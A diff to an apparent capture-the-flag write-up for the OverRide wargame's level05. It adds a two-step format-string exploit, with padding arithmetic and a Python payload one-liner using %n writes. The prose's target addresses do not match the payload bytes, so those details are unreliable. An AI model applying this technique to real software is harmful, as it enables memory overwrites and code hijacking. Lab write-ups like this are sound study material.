@@ -43,7 +43,19 @@ level05@OverRide:~$ cat <(python -c 'print("\xe0\x97\x04\x08" + "%4294957020x" +
 
 There is an issue, and it's quite strange because it doesn't print anything....
 And it doesn't work because `4294957020` is greater than int32_t max !
+
 So we need to write 2 bytes by 2 bytes:
+We need to write `0xd7e0 -> 0x08048370`  and `0xfff -> 0x08048372`
+Since we will have write 8 bytes already to specify the addresses, we have :
+
+```mathematica
+>>> a = 0xd7e0
+>>> a - 8
+55256
+>>> b = 0xffff
+>>> b - a 
+10271
+```
 
 ```bash
 cat <(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55256x" + "%10$n" + "%10271x" + "%11$n")') | ./level05
